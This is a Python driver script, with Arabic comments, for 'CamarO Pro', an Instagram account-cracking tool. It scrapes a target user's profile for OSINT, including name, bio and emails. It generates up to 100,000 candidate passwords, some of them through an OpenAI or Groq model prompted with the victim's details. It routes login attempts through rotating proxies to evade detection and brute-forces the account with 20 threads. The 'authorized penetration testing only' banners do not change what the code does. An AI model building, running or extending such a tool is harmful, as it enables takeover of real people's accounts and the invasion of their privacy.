#!/usr/bin/env python3
"""
CamarO Pro v3.0.0 - Instagram Security Assessment Framework
AI-Powered | Multi-Threaded | Stealth Mode
For Authorized Penetration Testing Only
"""

import sys
import os
import time
import threading
import json

# إضافة المسار
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.banner import show_banner, print_step
from src.utils.helpers import human_delay, save_results, load_config, format_number, log_time
from src.modules.osint_scanner import OSINTScanner
from src.modules.password_engine import PasswordEngine
from src.modules.ai_password_engine import AIPasswordEngine
from src.modules.login_tester import LoginTester
from src.modules.proxy_manager import ProxyManager
from src.modules.report_generator import ReportGenerator

from colorama import Fore, Back, Style, init
init(autoreset=True)

R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
M = Fore.MAGENTA
W = Fore.WHITE
RS = Style.RESET_ALL


class CamaroPro:
    """المحرك الرئيسي للأداة"""
    
    def __init__(self):
        self.config = load_config()
        self.username = ''
        self.osint_data = None
        self.password_list = []
        self.found_password = None
        self.total_attempts = 0
        self.start_time = None
    
    def get_username(self):
        """طلب اسم المستخدم"""
        print(f"\n{G}[?]{W} أدخل اسم حساب إنستغرام المستهدف: {C}", end='')
        username = input().strip().lower()
        
        if not username:
            print(f"{R}[!] يجب إدخال اسم حساب!{RS}")
            return self.get_username()
        
        if ' ' in username:
            print(f"{R}[!] اسم الحساب لا يحتوي على فراغات!{RS}")
            return self.get_username()
        
        return username
    
    def get_api_key(self):
        """طلب مفتاح API للذكاء الاصطناعي (اختياري)"""
        print(f"\n{Y}[?]{W} هل تريد تفعيل الذكاء الاصطناعي المتقدم؟ (y/n, Enter = no): {C}", end='')
        choice = input().strip().lower()
        
        if choice == 'y':
            print(f"\n{Y}[i] الذكاء الاصطناعي يولد كلمات مرور دقيقة بناءً على معلومات الهدف{RS}")
            print(f"{Y}[i] يمكنك الحصول على مفتاح مجاني من:{RS}")
            print(f"{C}  • Groq: https://console.groq.com/keys{RS}")
            print(f"{C}  • OpenAI: https://platform.openai.com/api-keys{RS}")
            print(f"\n{G}[?]{W} أدخل مفتاح API: {C}", end='')
            api_key = input().strip()
            if api_key:
                self.config['api_key'] = api_key
                # حفظ في config
                with open('config.json', 'w') as f:
                    json.dump(self.config, f, indent=4)
                print(f"{G}✅ تم حفظ المفتاح{RS}")
                return api_key
        
        return None
    
    def run(self):
        """تشغيل الأداة"""
        show_banner()
        
        print(f"\n{Y}{'═'*60}{RS}")
        print(f"{Y}⚠️  {W}أداة اختبار اختراق مصرّح بها فقط{R}")
        print(f"{Y}⚠️  {W}Authorized Penetration Testing Tool Only{R}")
        print(f"{Y}{'═'*60}{RS}\n")
        
        # الحصول على اسم المستخدم
        self.username = self.get_username()
        
        # الحصول على مفتاح API
        api_key = self.get_api_key()
        
        print(f"\n{G}🎯 الهدف: {C}{self.username}{RS}")
        
        # ====== المرحلة 1: OSINT ======
        print_step(1, 5, "جمع المعلومات الاستخباراتية (OSINT)", "progress")
        
        scanner = OSINTScanner(self.username)
        self.osint_data = scanner.scan()
        
        if not self.osint_data:
            print_step(1, 5, "فشل جمع المعلومات", "error")
            print(f"{R}[!] الحساب غير موجود أو محظور أو خاص{RS}")
            return
        
        print_step(1, 5, f"تم جمع معلومات {self.username}", "done")
        
        # عرض المعلومات المستخلصة
        print(f"\n{G}{'📋 معلومات الحساب:'}{RS}")
        print(f"  {W}👤 الاسم:{RS} {C}{self.osint_data.get('full_name', 'غير معروف')}{RS}")
        print(f"  {W}📝 السيرة:{RS} {Y}{self.osint_data.get('biography', 'فارغة')[:100]}{RS}")
        print(f"  {W}👥 متابعون:{RS} {C}{format_number(self.osint_data.get('follower_count', 0))}{RS}")
        print(f"  {W}📸 منشورات:{RS} {C}{format_number(self.osint_data.get('post_count', 0))}{RS}")
        print(f"  {W}🔒 خاص?:{RS} {'نعم' if self.osint_data.get('is_private') else 'لا'}")
        
        if self.osint_data.get('emails'):
            print(f"  {W}📧 إيميلات:{RS} {C}{', '.join(self.osint_data['emails'])}{RS}")
        
        # ====== المرحلة 2: توليد كلمات المرور ======
        print_step(2, 5, "توليد كلمات المرور بالذكاء الاصطناعي", "progress")
        
        # المحرك العادي
        engine = PasswordEngine(self.osint_data)
        self.password_list = engine.generate(limit=80000)
        
        # محرك AI (إذا وجد مفتاح)
        if api_key:
            ai_engine = AIPasswordEngine(self.osint_data, self.config)
            ai_passwords = ai_engine.generate_ai_passwords(count=20000)
            
            if ai_passwords:
                # دمج كلمات AI مع الكلمات العادية
                combined = list(set(self.password_list + ai_passwords))
                self.password_list = combined
                print(f"{G}🧠 تم دمج {len(ai_passwords)} كلمة من AI{RS}")
        
        print_step(2, 5, f"تم توليد {len(self.password_list):,} كلمة مرور فريدة", "done")
        
        # ====== المرحلة 3: إعداد البروكسيات ======
        print_step(3, 5, "إعداد شبكة البروكسيات للتخفي", "progress")
        
        proxy_manager = ProxyManager()
        proxy_manager.test_all_proxies()
        time.sleep(1)  # انتظار اختبار البروكسيات
        
        print_step(3, 5, "شبكة البروكسيات جاهزة", "done")
        
        # ====== المرحلة 4: الهجوم ======
        print_step(4, 5, "بدء اختبار كلمات المرور", "progress")
        
        print(f"\n{C}{'─'*50}{RS}")
        print(f"{Y}⚡ بدء الهجوم بـ 20 ثريد متزامن...{RS}")
        print(f"{R}⚠️  قد يستغرق هذا بعض الوقت. انتظر...{RS}")
        print(f"{C}{'─'*50}{RS}\n")
        
        self.start_time = time.time()
        
        # إعداد الـ LoginTester
        tester = LoginTester(
            self.username,
            proxies=proxy_manager.working_proxies or proxy_manager.proxies[:20],
            config=self.config
        )
        
        # شريط الحالة في ثريد منفصل
        def show_status():
            while not tester.found and tester.attempts < len(self.password_list):
                time.sleep(3)
                elapsed = time.time() - self.start_time
                progress = min(tester.attempts / len(self.password_list) * 100, 99)
                print(f"\r{C}📊 {W}{tester.attempts:,}{C}/{len(self.password_list):,} "
                      f"({Y}{progress:.1f}%{C}) | ⏱ {elapsed:.0f}s{RS}", end='', flush=True)
        
        status_thread = threading.Thread(target=show_status, daemon=True)
        status_thread.start()
        
        # تقسيم كلمات المرور على 20 ثريد
        num_threads = 20
        chunk_size = len(self.password_list) // num_threads + 1
        threads = []
        
        def worker(passwords_chunk):
            for pwd in passwords_chunk:
                if tester.found:
                    return
                tester.test_password(pwd)
        
        for i in range(0, len(self.password_list), chunk_size):
            chunk = self.password_list[i:i + chunk_size]
            t = threading.Thread(target=worker, args=(chunk,), daemon=True)
            threads.append(t)
            t.start()
        
        # انتظار جميع الثريدات
        for t in threads:
            t.join()
        
        self.total_attempts = tester.attempts
        self.found_password = tester.found_password
        
        elapsed_time = time.time() - self.start_time
        
        print()  # سطر جديد
        
        # ====== المرحلة 5: النتيجة ======
        print_step(5, 5, "النتيجة النهائية", self.found_password and "done" or "error")
        
        print(f"\n{C}{'═'*60}{RS}")
        
        if self.found_password:
            print(f"\n{Back.GREEN}{Fore.BLACK}  🎉  نـجـاح  🎉{RS}")
            print(f"\n{G}{'🔑' * 15}{RS}")
            print(f"{Back.WHITE}{Fore.BLACK}  {self.found_password}  {RS}")
            print(f"{G}{'🔑' * 15}{RS}")
            print(f"\n{C}✅ تم اختبار {W}{self.total_attempts:,}{C} كلمة مرور")
            print(f"{C}⏱ الوقت المستغرق: {W}{elapsed_time:.1f}{C} ثانية")
        else:
            print(f"\n{R}{'❌' * 15}{RS}")
            print(f"{R}❌ لم يتم العثور على كلمة المرور الصحيحة{RS}")
            print(f"{R}{'❌' * 15}{RS}")
            print(f"\n{Y}📊 تم اختبار {W}{self.total_attempts:,}{Y} كلمة مرور")
            print(f"{Y}💡 نصائح لتحسين النتيجة:")
            print(f"  {W}1.{Y} استخدم مفتاح API للذكاء الاصطناعي (توليد أدق)")
            print(f"  {W}2.{Y} أضف كلمات مخصصة في wordlists/")
            print(f"  {W}3.{Y} زد عدد كلمات المرور في config.json")
        
        # حفظ النتائج
        report_gen = ReportGenerator(self.username)
        report = report_gen.generate_report(
            self.osint_data, 
            self.found_password, 
            self.total_attempts, 
            elapsed_time
        )
        
        json_file = report_gen.save_json(report)
        print(f"\n{C}📁 تم حفظ التقرير في: {W}{json_file}{RS}")
        
        print(f"\n{G}{'═'*60}{RS}")
        print(f"{G}🚀 شكراً لاستخدام CamarO Pro{RS}")
        print(f"{C}للأغراض التعليمية واختبار الاختراق المصرّح به فقط{RS}")
        print(f"{G}{'═'*60}{RS}\n")


if __name__ == '__main__':
    try:
        app = CamaroPro()
        app.run()
    except KeyboardInterrupt:
        print(f"\n\n{Y}⚠️ تم إيقاف الأداة بواسطة المستخدم{RS}")
    except Exception as e:
        print(f"\n{R}❌ خطأ غير متوقع: {e}{RS}")
        import traceback
        traceback.print_exc()
    
    sys.exit(0)
